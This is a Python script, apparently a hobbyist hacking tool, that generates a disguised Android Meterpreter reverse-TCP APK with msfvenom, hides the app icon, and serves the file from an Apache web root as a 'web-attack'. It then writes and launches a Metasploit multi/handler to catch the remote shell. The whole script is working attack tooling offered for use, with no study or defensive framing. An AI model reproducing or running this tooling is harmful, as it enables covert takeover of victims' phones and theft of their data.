from termcolor import colored
import os, sys, time, requests
from time import sleep
# Normal
black="\033[0;30m"
red="\033[0;31m"
green="\033[0;32m"
yellow="\033[0;33m"  
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
white="\033[0;37m"
Red ="\u001b[31m"
Green ="\u001b[32m"
Blue = '\033[94m'

# Bold
bblack="\033[1;30m"
bred="\033[1;31m"
bgreen="\033[1;32m"
byellow="\033[1;33m"
bblue="\033[1;34m"
bpurple="\033[1;35m"
bcyan="\033[1;36m"
bwhite="\033[1;37m"

ask = green + '[' + white + '?' + green + '] '+ yellow
success = green + '[' + white + '√' + green + '] '
error = red + '[' + white + '!' + red + '] '
pw= yellow + '\n[' + white + '+' +yellow + ']'+' Please Wait!'

os.system("clear")
logo =blue+'''
      ██╗ █████╗ ██╗   ██╗███╗   ███╗███████╗████████╗ █████╗ 
      '''+red+'''██║██╔══██╗╚██╗ ██╔╝████╗ ████║██╔════╝╚══██╔══╝██╔══██╗
      '''+green+'''██║███████║ ╚████╔╝ ██╔████╔██║█████╗     ██║   ███████║
 '''+yellow+'''██   ██║██╔══██║  ╚██╔╝  ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║
  '''+cyan+'''█████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║
   '''+purple+'''════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
                                                             
         '''+cyan+'''    ████████╗ ██████╗  ██████╗ ██╗               
         '''+green+'''   ╚══ ██╔══╝██╔═══██╗██╔═══██╗██║               
         '''+red+'''       ██║   ██║   ██║██║   ██║██║               
         '''+yellow+'''       ██║   ██║   ██║██║   ██║██║               
         '''+blue+'''       ██║   ╚██████╔╝╚██████╔╝███████╗          
         '''+purple+'''       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝  
         '''+yellow+'''     [https://github.com/JayTrimbake]       
                       Insta: _.jay.___14
         [Android Payload Generator by Jay Trimbake]
'''
def slowprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.001)
slowprint(logo)

user0 = input(colored("[+]If you want see Ipaddress of etho y/n: ",'green'))
user9 = input(colored("[+]If you want see Ipaddress of wlan0 y/n: ",'green'))
if user9 == "y":
 os.system("ip address show wlan0")
else:
 print(red,"Subscribe My Youtube Channel")

if user0 == "y":
 os.system("ip address show eth0")
else:
 print(red,"Subscribe My Youtube Channel")

user = input(Blue +"[+]Enter the Host: ")
user2 = input(yellow +"[+]Set the Port:  ")
user3 = input(Blue +"[+]Enter the App Name: ")
print(Green, '[+]Generating Payload')
os.system("msfvenom -p android/meterpreter/reverse_tcp AndroidHideAppIcon=true AndroidWakeLock=true lhost=" + user + " lport=" + user2 + " -o /home/kali/Desktop/"+ user3 +".apk ")

time.sleep(3)
print("[+]Payload saved as Desktop/" + user3 + ".apk")
user4 = input("[+]Do you want to start this web-attack y/n: ")
if user4 == "y":
 os.system("service apache2 start")
 os.system("sudo cp -r  /home/kali/Desktop/" + user3 + ".apk /var/www/html")
 print("VectorAttack Started: http://"+user)
else:
    print("Thank You")
    pass
    
listen = input(Green + "do you want to start multi/handler y/n:")
if listen == "y":
 with open("handlers/" + user3 + ".rc", "w") as hand:
                hand.write("use multi/handler\n")
                hand.write("set payload android/meterpreter/reverse_tcp\n")
                hand.write("set lhost " + user + "\n")
                hand.write("set lport " + user2 + "\n")
                hand.write("exploit")
                hand.close()
                os.system("sudo msfconsole -r handlers/" + user3 + ".rc")







  
